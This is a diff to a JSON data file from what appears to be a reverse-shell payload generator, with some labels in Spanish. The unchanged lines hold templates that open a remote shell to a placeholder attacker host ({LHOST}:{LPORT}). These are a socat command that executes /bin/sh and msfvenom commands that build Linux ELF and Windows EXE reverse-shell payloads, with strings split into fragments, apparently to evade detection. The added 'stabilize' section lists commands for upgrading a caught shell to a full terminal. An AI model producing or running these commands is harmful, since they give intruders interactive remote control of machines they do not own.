@@ -11,5 +11,12 @@
     { "id": "socat", "label": "socat pty", "parts": ["socat TCP:{LHOST}:{LPORT} EXEC:'/bin/", "sh',pty,stderr,setsid,sigint,sane"] },
     { "id": "msf-linux", "label": "msfvenom Linux", "parts": ["msfvenom -p linux/x64/shell_reverse", "_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf"] },
     { "id": "msf-win", "label": "msfvenom Windows", "parts": ["msfvenom -p windows/x64/shell_reverse", "_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe"] }
+  ],
+  "stabilize": [
+    { "label": "PTY con python3", "parts": ["python3 -c 'import pty;pty.spawn(\"/bin/", "bash\")'"] },
+    { "label": "PTY con script", "parts": ["script -qc /bin/", "bash /dev/null"] },
+    { "label": "Fijar TERM", "parts": ["export TERM=xterm-256color"] },
+    { "label": "Reconectar (en TU maquina, tras Ctrl+Z)", "parts": ["stty raw -echo; fg"] },
+    { "label": "Ajustar tamano (mira stty size en tu maquina)", "parts": ["stty rows 50 cols 200"] }
   ]
 }
